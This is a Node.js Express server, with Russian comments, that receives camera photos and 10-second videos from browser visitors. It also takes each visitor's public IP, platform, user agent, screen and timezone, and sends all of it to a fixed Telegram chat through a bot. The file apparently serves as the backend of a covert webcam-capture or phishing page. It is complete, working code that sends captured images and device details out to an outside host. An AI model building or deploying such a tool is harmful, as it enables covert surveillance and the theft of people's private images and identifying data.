require('dotenv').config();  // подхватывает .env локально

const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');

const app = express();

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть заданы');
  process.exit(1);
}

app.use(express.static(path.join(__dirname, 'public')));

// Health-check для Render
app.get('/healthz', (req, res) => res.json({ ok: true }));

// ===== Фото =====
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: 'Нет файла photo' });

    let info = {};
    try { info = JSON.parse(req.body.info || '{}'); } catch {}

    const caption = [
      '📸 Снимок с камеры',
      `🌐 IP: ${info.publicIP || '—'}`,
      `📱 Платформа: ${info.platform || '—'}`,
      `🖥 Браузер: ${(info.userAgent || '').slice(0, 120)}`,
      `🖼 Экран: ${info.screen || '—'}`,
      `🕐 Часовой пояс: ${info.timezone || '—'}`,
    ].join('\n');

    const tgForm = new FormData();
    tgForm.append('chat_id', TELEGRAM_CHAT_ID);
    tgForm.append('caption', caption);
    tgForm.append('photo', req.file.buffer, {
      filename: 'capture.jpg',
      contentType: 'image/jpeg'
    });

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      { method: 'POST', body: tgForm }
    );
    const tgData = await tgRes.json();

    if (!tgData.ok) {
      return res.status(502).json({ error: 'Telegram error', detail: tgData.description });
    }
    res.json({ ok: true });
  } catch (err) {
    console.error('Photo error:', err);
    res.status(500).json({ error: err.message });
  }
});

// ===== Видео =====
app.post('/upload-video', upload.single('video'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: 'Нет файла video' });
    if (req.file.size > 50 * 1024 * 1024) {
      return res.status(413).json({ error: 'Видео больше 50 МБ' });
    }

    let info = {};
    try { info = JSON.parse(req.body.info || '{}'); } catch {}

    const caption = [
      '🎥 Видео с камеры (10 сек)',
      `🌐 IP: ${info.publicIP || '—'}`,
      `📱 Платформа: ${info.platform || '—'}`,
      `🖥 Браузер: ${(info.userAgent || '').slice(0, 120)}`,
      `📦 Размер: ${(req.file.size / 1024 / 1024).toFixed(2)} МБ`,
    ].join('\n');

    const isMp4 = (req.file.mimetype || '').includes('mp4');
    const ext = isMp4 ? 'mp4' : 'webm';
    const ctype = isMp4 ? 'video/mp4' : 'video/webm';

    const tgForm = new FormData();
    tgForm.append('chat_id', TELEGRAM_CHAT_ID);
    tgForm.append('caption', caption);
    tgForm.append('supports_streaming', 'true');
    tgForm.append('video', req.file.buffer, {
      filename: `capture.${ext}`,
      contentType: ctype
    });

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
      { method: 'POST', body: tgForm }
    );
    const tgData = await tgRes.json();

    if (!tgData.ok) {
      return res.status(502).json({ error: 'Telegram error', detail: tgData.description });
    }
    res.json({ ok: true });
  } catch (err) {
    console.error('Video error:', err);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
